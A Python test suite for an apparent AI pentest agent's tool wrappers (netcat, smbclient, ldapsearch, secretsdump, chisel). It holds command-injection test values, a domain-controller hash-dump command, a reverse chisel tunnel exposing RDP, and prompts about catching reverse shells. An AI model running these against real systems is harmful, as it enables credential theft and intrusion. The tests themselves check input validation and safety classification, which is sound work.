"""第五批深度定制档案测试：netcat / smbclient / ldapsearch / secretsdump / chisel。"""

import asyncio
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from DeepKali.profiles import REGISTRY, all_schemas, lore_for, register_extensions  # noqa: E402
from DeepKali.profiles.chisel import _build_cmd as chisel_cmd  # noqa: E402
from DeepKali.profiles.ldapsearch import _build_cmd as ldap_cmd  # noqa: E402
from DeepKali.profiles.netcat import _escape_data, _nc_bin  # noqa: E402
from DeepKali.profiles.secretsdump import _build_cmd as secretsdump_cmd  # noqa: E402
from DeepKali.profiles.smbclient import _build_cmd as smbclient_cmd  # noqa: E402
from DeepKali.safety import classify  # noqa: E402

# ---------------- 命令构造与校验 ----------------


def test_netcat_data_escape() -> None:
    assert _escape_data("GET / HTTP/1.0") == "'GET / HTTP/1.0'"
    assert _escape_data("a'b") == "'a'\\''b'"
    assert _escape_data("x; rm -rf /") == "'x; rm -rf /'"  # 单引号包裹后无注入


def test_smbclient_cmd() -> None:
    cmd, _ = smbclient_cmd({"host": "10.0.0.5", "share": "shared"})
    assert cmd == "smbclient //10.0.0.5/shared -N -c ls"
    cmd2, _ = smbclient_cmd({"host": "10.0.0.5", "share": "C$", "path": "Users/Public", "username": "admin", "password": "p@ss", "domain": "CORP"})
    assert "//10.0.0.5/C$/Users/Public" in cmd2
    assert "-U 'CORP\\admin%p@ss'" in cmd2
    with pytest.raises(ValueError):
        smbclient_cmd({"host": "10.0.0.5", "share": "x;ls"})
    with pytest.raises(ValueError):
        smbclient_cmd({"host": "10.0.0.5", "share": "shared", "path": "..;id"})


def test_ldap_cmd() -> None:
    cmd, _ = ldap_cmd({"host": "10.0.0.5"})
    assert cmd == 'ldapsearch -x -H ldap://10.0.0.5 -s sub -LLL -z 200 (objectClass=*)'
    cmd2, _ = ldap_cmd({
        "host": "10.0.0.5",
        "base_dn": "DC=corp,DC=local",
        "filter": "(objectClass=user)",
        "attributes": "sAMAccountName memberOf",
        "username": "CORP\\svc",
        "password": "pass1",
    })
    assert "-D CORP\\svc -w pass1" in cmd2
    assert "-b DC=corp,DC=local" in cmd2
    assert "(objectClass=user)" in cmd2 and "sAMAccountName memberOf" in cmd2
    with pytest.raises(ValueError):
        ldap_cmd({"host": "10.0.0.5", "filter": "(x=1);id"})
    with pytest.raises(ValueError):
        ldap_cmd({"host": "10.0.0.5", "base_dn": "DC=x;ls"})


def test_secretsdump_cmd() -> None:
    cmd, _ = secretsdump_cmd({"host": "10.0.0.10", "username": "administrator", "password": "P@ss", "domain": "CORP"})
    assert "secretsdump" in cmd and "CORP\\administrator:P@ss@10.0.0.10" in cmd
    assert "-ntds" in cmd and "-just-dc-ntlm" in cmd
    cmd2, _ = secretsdump_cmd({"host": "10.0.0.10", "username": "admin", "hash": "a" * 32, "target": "sam"})
    assert "-sam" in cmd2 and "admin@10.0.0.10" in cmd2 and "a" * 32 not in cmd2.split("@")[0]
    with pytest.raises(ValueError):
        secretsdump_cmd({"host": "10.0.0.10", "username": "admin"})
    with pytest.raises(ValueError):
        secretsdump_cmd({"host": "10.0.0.10", "username": "admin", "password": "x", "hash": "y"})
    with pytest.raises(ValueError):
        secretsdump_cmd({"host": "10.0.0.10", "username": "admin", "password": "x", "target": "all"})
    assert classify(cmd).level == "confirm"


def test_chisel_cmd() -> None:
    cmd, timeout = chisel_cmd({"server": "1.2.3.4:8080", "mode": "reverse", "remote": "R:8081:127.0.0.1:3389"})
    assert cmd == "timeout 30 chisel client 1.2.3.4:8080 R:8081:127.0.0.1:3389"
    assert timeout > 30
    cmd2, _ = chisel_cmd({"server": "1.2.3.4:8080", "mode": "reverse", "remote": "R:x", "socks": True})
    assert "R:socks" in cmd2
    with pytest.raises(ValueError):
        chisel_cmd({"server": "1.2.3.4:8080;id", "mode": "reverse", "remote": "R:8081:127.0.0.1:3389"})
    with pytest.raises(ValueError):
        chisel_cmd({"server": "1.2.3.4:8080", "mode": "sideways", "remote": "R:1:2:3"})
    assert classify(cmd).level == "confirm"


# ---------------- registry / lore ----------------


def test_registry_fifth_batch() -> None:
    names = [s["function"]["name"] for s in all_schemas()]
    for t in ("nc_listen", "nc_connect", "smb_ls", "ldap_enum", "secrets_dump", "chisel_tunnel"):
        assert t in names
    pnames = [p.name for p in REGISTRY]
    for n in ("netcat", "smbclient", "ldapsearch", "secretsdump", "chisel"):
        assert n in pnames
    assert len(REGISTRY) >= 24


def test_lore_fifth_batch() -> None:
    assert "netcat" in lore_for([{"role": "user", "content": "监听 4444 端口接收反弹 shell"}])
    assert "smbclient" in lore_for([{"role": "user", "content": "看看 10.0.0.5 的共享目录里有什么"}])
    assert "ldapsearch" in lore_for([{"role": "user", "content": "对域控做 ad 查询枚举用户"}])
    assert "secretsdump" in lore_for([{"role": "user", "content": "提取域控的 hash"}])
    assert "chisel" in lore_for([{"role": "user", "content": "打通到内网的隧道"}])


# ---------------- stub 流转 ----------------


class StubEx5:
    def __init__(self):
        self.calls: list[tuple[str, dict]] = []
        self.danger_policy = "ask"
        self.extensions: dict = {}

    async def execute(self, name: str, arguments: dict) -> str:
        self.calls.append((name, arguments))
        return "STUB-OUTPUT\nsome data"


@pytest.mark.asyncio
async def test_fifth_batch_route_to_run_command(monkeypatch: pytest.MonkeyPatch) -> None:
    import DeepKali.profiles.chisel as chisel_mod

    monkeypatch.setattr(chisel_mod, "check_installed", lambda _b: True)  # 本机未装 chisel
    stub = StubEx5()
    register_extensions(stub)  # type: ignore[arg-type]

    await stub.extensions["nc_listen"](stub, {"port": 4444, "seconds": 5})
    assert "n" in stub.calls[-1][1]["command"] or "nc" in stub.calls[-1][1]["command"]

    await stub.extensions["smb_ls"](stub, {"host": "10.0.0.5", "share": "shared"})
    assert "smbclient //10.0.0.5/shared" in stub.calls[-1][1]["command"]

    await stub.extensions["ldap_enum"](stub, {"host": "10.0.0.5"})
    assert "ldapsearch -x -H ldap://10.0.0.5" in stub.calls[-1][1]["command"]

    await stub.extensions["chisel_tunnel"](stub, {"server": "1.2.3.4:8080", "mode": "reverse", "remote": "R:8081:127.0.0.1:3389"})
    assert "chisel client 1.2.3.4:8080 R:8081:127.0.0.1:3389" in stub.calls[-1][1]["command"]
